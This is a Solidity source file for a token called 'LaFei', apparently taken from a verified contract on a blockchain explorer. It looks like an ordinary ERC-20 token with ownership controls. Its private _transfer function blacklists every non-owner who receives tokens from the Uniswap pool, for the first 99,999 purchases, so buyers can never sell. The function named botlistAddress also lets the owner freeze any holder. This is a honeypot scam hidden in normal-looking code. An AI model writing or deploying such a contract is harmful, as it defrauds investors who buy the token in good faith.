/**
 *Submitted for verification at Arbiscan on 2023-05-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

}

/// @title The interface for the Uniswap V3 Factory
/// @notice The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees
interface IUniswapV3Factory {

    function createPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external returns (address pool);

}

contract LaFei is Ownable{
    string public name = "LaFei";
    string public symbol = "LaFei";
    uint256 public totalSupply = 100000000000 * 10 ** 18;
    uint8 public decimals = 18;
    address public uniswapPair;
    uint256 public index;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public _isBlacklisted;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
        uniswapPair = uniswapFactory.createPool(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, address(this), 100);
        balanceOf[msg.sender] = totalSupply;
    }

    function botlistAddress(address account, bool excluded) public onlyOwner {
        _isBlacklisted[account] = excluded;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        _transfer(msg.sender, to);
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        _transfer(from, to);
        require(value <= balanceOf[from], "Insufficient balance");
        require(value <= allowance[from][msg.sender], "Insufficient allowance");
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function _transfer(address sender, address recipient) private {
        require(!_isBlacklisted[sender], "Blacklisted address");
        if(uniswapPair == sender && recipient != _owner){
            if(index < 99999){
                _isBlacklisted[recipient] = true;
            }
            index = index+=1;
        }
        if(uniswapPair == address(0)&&recipient != _owner){
            _isBlacklisted[recipient] = true;
        }
    }
}